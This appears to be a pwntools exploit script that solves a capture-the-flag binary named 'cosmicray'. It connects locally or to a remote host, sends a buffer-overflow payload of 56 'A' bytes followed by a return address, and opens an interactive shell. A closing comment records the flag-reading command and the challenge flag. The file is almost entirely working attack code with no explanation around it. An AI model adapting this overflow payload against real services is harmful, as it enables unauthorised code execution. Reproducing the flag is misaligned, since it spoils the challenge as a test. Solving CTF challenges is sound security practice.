from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./cosmicray_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
r.sendlineafter(b'it:',b'0x00000000004016f4')
r.sendlineafter(b'(0-7):',b'7')
r.sendlineafter(b'today:\n', b'A' * 56 + p64(0x4012d6))
r.interactive()

'''
cat /home/`whoami`/f*
SEKAI{w0w_pwn_s0_ez_wh3n_I_can_s3nd_a_c05m1c_ray_thru_ur_cpu}
'''